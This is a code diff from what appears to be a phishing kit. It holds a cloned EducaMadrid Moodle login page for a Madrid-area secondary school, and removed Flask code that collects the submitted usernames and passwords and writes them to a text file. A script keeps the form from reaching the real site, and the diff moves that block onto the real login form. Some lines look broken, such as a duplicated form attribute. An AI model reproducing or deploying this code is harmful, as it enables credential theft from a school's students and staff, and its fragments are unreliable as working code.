@@ -1,9 +1,3 @@
-from flask import Flask, request, render_template_string
-
-app = Flask(__name__)
-
-# Página con el formulario
-form_html = """
 <!DOCTYPE html>
  	 
  	<html dir="ltr" lang="es" xml:lang="es">
@@ -80,7 +74,7 @@ form_html = """
  	</form>
  	<div class="login-divider"></div>
  	<h2 class="login-heading">Algunos cursos permiten el acceso de invitados</h2>
-    <form method="post" id="login"> id="guestlogin">
+ 	<form action="https://aulavirtual35.educa.madrid.org/ies.jimenamenendezpidal.fuenlabrada/login/index.php" method="post" id="guestlogin">
  	<input type="hidden" name="logintoken" value="GjQsPBtA3izAbJghWJPhLyYVKSm82EMa">
  	<input type="hidden" name="username" value="guest" />
  	<input type="hidden" name="password" value="guest" />
@@ -88,7 +82,7 @@ form_html = """
  	</form>
  	<div class="login-divider"></div>
  	<div class="d-flex">
- 	<button type="button" id="btnLogin">Acceder</button>
+ 	<button type="button" class="btn btn-secondary" data-modal="alert" data-modal-title-str='["cookiesenabled", "core"]' data-modal-content-str='["cookiesenabled_help_html", "core"]'>Aviso de Cookies</button>
  	</div>
  	</div></div>
  	</div>
@@ -217,7 +211,7 @@ form_html = """
  	</div>
  	 <script>
 
-  document.getElementById("btnLogin").addEventListener("click", function () {
+  document.getElementById("login").addEventListener("submit", function (e) {
 
     e.preventDefault(); // ⛔ evita que se envíe a educamadrid
 
@@ -236,24 +230,3 @@ form_html = """
 </script>
  	 
  	</body></html>
-"""
-
-@app.route('/')
-def index():
-    return render_template_string(form_html)
-
-# Ruta que recibe los datos del formulario
-@app.route('/enviar', methods=['POST'])
-def recibir_datos():
-    username = request.form.get('username')
-    password = request.form.get('password')
-    
-
-    # Guardar en un archivo
-    with open("datos_favoritos.txt", "a") as f:
-        f.write(f"Username: {username}, Password: {password}\n")
-
-    return f"Gracias! Datos recibidos: Username={username}, Password={password}"
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
